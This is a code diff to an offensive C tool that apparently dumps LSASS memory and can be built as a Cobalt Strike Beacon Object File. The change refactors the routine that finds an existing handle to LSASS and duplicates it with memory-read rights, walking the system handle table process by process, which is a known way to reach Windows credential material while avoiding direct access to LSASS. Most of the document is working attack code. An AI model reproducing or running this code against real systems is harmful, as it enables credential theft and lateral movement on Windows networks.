@@ -32,7 +32,7 @@ void append(
 #else
         printf(
 #endif
-            "The dump is too big. Increase DUMP_MAX_SIZE.\n"
+            "The dump is too big, please increase DUMP_MAX_SIZE.\n"
         );
     }
     else
@@ -1518,11 +1518,11 @@ PSYSTEM_HANDLE_INFORMATION get_all_handles(void)
             if (buffer_size < initial_size)
             {
                 // an integer overflow is extremely unlikely, but just in case...
-        #ifdef BOF
+#ifdef BOF
                 BeaconPrintf(CALLBACK_ERROR,
-        #else
+#else
                 printf(
-        #endif
+#endif
                     "Cannot increase buffer_size any more\n"
                 );
                 return NULL;
@@ -1530,11 +1530,11 @@ PSYSTEM_HANDLE_INFORMATION get_all_handles(void)
             handleTableInformation = intAlloc(buffer_size);
             if (!handleTableInformation)
             {
-        #ifdef BOF
+#ifdef BOF
                 BeaconPrintf(CALLBACK_ERROR,
-        #else
+#else
                 printf(
-        #endif
+#endif
                     "Failed to call HeapAlloc for 0x%lx bytes, error: %ld\n",
                     buffer_size,
                     KERNEL32$GetLastError()
@@ -1560,6 +1560,61 @@ PSYSTEM_HANDLE_INFORMATION get_all_handles(void)
     }
 }
 
+BOOL process_is_included(
+    PPROCESS_LIST process_list,
+    ULONG ProcessId
+)
+{
+    for (ULONG i = 0; i < process_list->Count; i++)
+    {
+        if (process_list->ProcessId[i] == ProcessId)
+            return TRUE;
+    }
+    return FALSE;
+}
+
+PPROCESS_LIST get_processest_from_handle_table(
+    PSYSTEM_HANDLE_INFORMATION handleTableInformation
+)
+{
+    PPROCESS_LIST process_list = (PPROCESS_LIST)intAlloc(sizeof(PROCESS_LIST));
+    if (!process_list)
+    {
+#ifdef BOF
+        BeaconPrintf(CALLBACK_ERROR,
+#else
+        printf(
+#endif
+            "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
+            (ULONG32)sizeof(PROCESS_LIST),
+            KERNEL32$GetLastError()
+        );
+        return NULL;
+    }
+
+    for (ULONG i = 0; i < handleTableInformation->Count; i++)
+    {
+        PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[i];
+
+        if (!process_is_included(process_list, handleInfo->ProcessId))
+        {
+            process_list->ProcessId[process_list->Count++] = handleInfo->ProcessId;
+            if (process_list->Count == MAX_PROCESSES)
+            {
+#ifdef BOF
+                BeaconPrintf(CALLBACK_ERROR,
+#else
+                printf(
+#endif
+                    "Too many processes, please increase MAX_PROCESSES\n"
+                );
+                break;
+            }
+        }
+    }
+    return process_list;
+}
+
 HANDLE duplicate_lsass_handle(
     DWORD dwPid
 )
@@ -1570,68 +1625,75 @@ HANDLE duplicate_lsass_handle(
     if (!handleTableInformation)
         return NULL;
 
-    for (ULONG i = 0; i < handleTableInformation->Count; i++)
+    PPROCESS_LIST process_list = get_processest_from_handle_table(handleTableInformation);
+    if (!process_list)
+        return NULL;
+
+    for (ULONG i = 0; i < process_list->Count; i++)
     {
-        PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[i];
+        ULONG ProcessId = process_list->ProcessId[i];
 
-        if (handleInfo->ProcessId == dwPid)
+        if (ProcessId == dwPid)
             continue;
-        if (handleInfo->ProcessId == 4)
+        if (ProcessId == 4)
             continue;
-
 
         // open a handle to the process with PROCESS_DUP_HANDLE
-        // TODO: open a handle to each process only once
         HANDLE hProcess = get_process_handle(
-            handleInfo->ProcessId,
+            ProcessId,
             PROCESS_DUP_HANDLE,
             TRUE
         );
         if (!hProcess)
             continue;
 
-        // duplicate the handle
-        HANDLE hDuped;
-        status = NtDuplicateObject(
-            hProcess,
-            (HANDLE)(DWORD_PTR)handleInfo->Handle,
-            NtCurrentProcess(),
-            &hDuped,
-            PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,
-            0,
-            0
-        );
-        if (!NT_SUCCESS(status))
+        // this isn't super efficient but whatever
+        for (ULONG j = 0; j < handleTableInformation->Count; j++)
         {
-            NtClose(hProcess); hProcess = NULL;
-            continue;
-        }
+            PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[j];
 
-        if (!is_process_handle(hDuped))
-        {
-            NtClose(hDuped); hDuped = NULL;
-            NtClose(hProcess); hProcess = NULL;
-            continue;
-        }
+            if (handleInfo->ProcessId != ProcessId)
+                continue;
 
-        if (is_lsass(hDuped))
-        {
-            // found LSASS handle
-#ifdef BOF
-            BeaconPrintf(CALLBACK_OUTPUT,
-#else
-            printf(
-#endif
-                "Found LSASS handle: 0x%x, on process: %ld\n",
-                handleInfo->Handle,
-                handleInfo->ProcessId
+            // duplicate the handle
+            HANDLE hDuped;
+            status = NtDuplicateObject(
+                hProcess,
+                (HANDLE)(DWORD_PTR)handleInfo->Handle,
+                NtCurrentProcess(),
+                &hDuped,
+                PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,
+                0,
+                0
             );
-            intFree(handleTableInformation); handleTableInformation = NULL;
-            NtClose(hProcess); hProcess = NULL;
-            return hDuped;
-        }
+            if (!NT_SUCCESS(status))
+                continue;
 
-        NtClose(hDuped); hDuped = NULL;
+            if (!is_process_handle(hDuped))
+            {
+                NtClose(hDuped); hDuped = NULL;
+                continue;
+            }
+
+            if (is_lsass(hDuped))
+            {
+                // found LSASS handle
+#ifdef BOF
+                BeaconPrintf(CALLBACK_OUTPUT,
+#else
+                printf(
+#endif
+                    "Found LSASS handle: 0x%x, on process: %ld\n",
+                    handleInfo->Handle,
+                    handleInfo->ProcessId
+                );
+                intFree(handleTableInformation); handleTableInformation = NULL;
+                intFree(process_list); process_list = NULL;
+                NtClose(hProcess); hProcess = NULL;
+                return hDuped;
+            }
+            NtClose(hDuped); hDuped = NULL;
+        }
         NtClose(hProcess); hProcess = NULL;
     }
 
@@ -1644,6 +1706,7 @@ HANDLE duplicate_lsass_handle(
     );
 
     intFree(handleTableInformation); handleTableInformation = NULL;
+    intFree(process_list); process_list = NULL;
     return NULL;
 }
 
@@ -1757,7 +1820,7 @@ void go(char* args, int length)
                 pid
             );
         }
-        if (dup)
+        else if (dup)
         {
             hProcess = duplicate_lsass_handle(
                 pid
@@ -1984,7 +2047,7 @@ int main(int argc, char* argv[])
                 pid
             );
         }
-        if (dup)
+        else if (dup)
         {
             hProcess = duplicate_lsass_handle(
                 pid
